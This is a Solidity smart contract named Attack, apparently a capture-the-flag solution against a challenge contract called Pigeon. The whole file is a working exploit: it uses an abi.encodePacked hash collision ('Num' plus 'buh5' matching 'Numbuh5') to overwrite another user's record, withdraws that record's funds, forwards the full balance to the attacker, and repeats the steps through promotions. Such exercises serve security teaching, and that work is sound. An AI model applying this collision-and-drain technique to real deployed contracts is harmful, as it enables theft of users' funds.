// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "./Pigeon.sol";

contract Attack {
    Pigeon target;

    constructor(address _target) 
    {
        
        target = Pigeon(_target);
    }

    function attack() public
    {
        //so we are able to achieve the task points afterwards
        bytes32 codename1 = keccak256(abi.encodePacked("Numbuh", "5"));
        bytes32 codename2 = keccak256(abi.encodePacked("Numbuh", "3"));
        bytes32 codename3 = keccak256(abi.encodePacked("Numbuh", "1"));

        //get the money of the first pigeon by overwritting the juniorPigeon[Codename]
        target.becomeAPigeon("Num", "buh5");
        target.flyAway(codename1, 0);

        //Send all the money to the attacker
        msg.sender.call{value: address(this).balance}("");

        //upgrade
        target.task(codename1, msg.sender, msg.sender.balance);
        target.promotion(codename1, 1, "Num", "buh3");
        target.flyAway(codename2, 1);

        //Send all the money to the attacker
        msg.sender.call{value: address(this).balance}("");

        target.task(codename2, msg.sender, msg.sender.balance);
        target.promotion(codename2, 2, "Num", "buh1");
        target.flyAway(codename3, 2);

        //Send all the money to the attacker
        msg.sender.call{value: address(this).balance}("");
    }

    receive() payable external
    {

    }
}


